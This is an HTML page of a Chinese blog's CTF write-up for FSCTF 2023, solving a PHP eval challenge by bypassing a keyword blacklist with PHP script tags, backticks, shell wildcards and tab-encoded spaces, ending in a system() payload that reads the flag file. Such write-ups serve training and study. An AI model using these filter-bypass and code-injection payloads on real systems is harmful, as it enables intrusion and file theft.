@@ -1,0 +1,248 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FSCTF部分题解 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="FSCTF部分题解 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="http://userb1ank.xyz/2023/10/25/wp/FSCTF%E5%A4%8D%E7%8E%B0/
+EZ_eval
+&lt;?php
+    if(isset($_GET['word'])){
+    $word = $..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              FSCTF部分题解
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-25
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>http://userb1ank.xyz/2023/10/25/wp/FSCTF%E5%A4%8D%E7%8E%B0/</p>
+<h2 id="ez_eval">EZ_eval</h2>
+<pre><code>&lt;?php
+    if(isset($_GET['word'])){
+    $word = $_GET['word'];
+    if (preg_match(&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;, $word)){
+       die(&quot;nonono.&quot;);
+    }
+    $word = str_replace(&quot;?&quot;, &quot;&quot;, $word);
+    eval(&quot;?&gt;&quot;. $word);
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<h3 id="基础知识">基础知识</h3>
+<p><strong>PHP 标签</strong></p>
+<pre><code>&lt;? ?&gt;
+&lt;?php ?&gt;
+&lt;?= ?&gt; 
+&lt;script language='php'&gt; &lt;/script&gt;
+</code></pre>
+<p>其中，<? ?>相当于对<?php ?>的替换。而<?= ?>则是相当于<?php echo ... ?>。例如：</p>
+<?='Hello World'?>    // 输出 "Hello World"
+<p><strong>PHP 中的反引号</strong><br>
+PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：</p>
+<pre><code>&lt;?php echo `ls /`;?&gt;
+</code></pre>
+<p>还可以使用<?= ?>短标签（比较灵活）：</p>
+<pre><code>&lt;?= `ls /`?&gt;
+</code></pre>
+<p><strong>通配符在 RCE 中的利用</strong><br>
+先说一下原理：</p>
+<p>在正则表达式中，?这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或一次。</p>
+<p>在 Shell 命令行中，?这样的通配符与其它字符一起组合成表达式，匹配任意一个字符。</p>
+<p>同理，我们可以知道*通配符：</p>
+<p>在正则表达式中，*这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或多次。</p>
+<p>在shell命令行中，*这样的通配符与其它字符一起组合成表达式，匹配任意长度的字符串。这个字符串的长度可以是0，可以是1，可以是任意数字。</p>
+<p>所以，我们利用?和*在正则表达式和 Shell 命令行中的区别，可以绕过关键字过滤，如下实例：</p>
+<p>假设flag在/flag中:</p>
+<pre><code>cat /fla?
+cat /fla*
+</code></pre>
+<p>假设flag在/flag.txt中:</p>
+<pre><code>cat /fla????
+cat /fla*
+</code></pre>
+<p>假设flag在/flags/flag.txt中:</p>
+<pre><code>cat /fla??/fla????
+cat /fla*/fla*
+</code></pre>
+<p>假设flag在flagg文件加里:</p>
+<pre><code>cat /?????/fla?
+cat /?????/fla*
+</code></pre>
+<p>我们可以用以上格式的 Payload 都可以读取到flag。</p>
+<p>以上基础知识引用自:https://www.freebuf.com/articles/network/279563.html</p>
+<p>回到此题中,就可以很容易构造一个payload:</p>
+<pre><code>&lt;script%09language='php'&gt;system('ta\c%09/f*');&lt;/script&gt;
+</code></pre>
+<p>这里需要用<code>%09</code>来替换空格</p>
+<h2 id="fsctf-2023签到plus">[FSCTF 2023]签到plus</h2>
+<p>这里是考察了一个php版本漏洞,但当时并没有扫出来目录下的<code>shell.php</code>,于是就蒙了<br>
+复现:<br>
+扫目录:<br>
+<img src="https://NaCl1.github.io/post-images/1698252699962.png" alt="" loading="lazy"></p>
+<p>wp里说有php敏感版本,具体怎么发现没细说,我这里用nmap扫了一下<br>
+<img src="https://NaCl1.github.io/post-images/1698253273731.png" alt="" loading="lazy"></p>
+<p>https://www.ai2news.com/blog/3109593/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#ez_eval">EZ_eval</a>
+<ul>
+<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a></li>
+</ul>
+</li>
+<li><a href="#fsctf-2023%E7%AD%BE%E5%88%B0plus">[FSCTF 2023]签到plus</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/wen-jian-shang-chuan-zhi-tiao-jian-jing-zheng/">
+              <h3 class="post-title">
+                文件上传之条件竞争
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
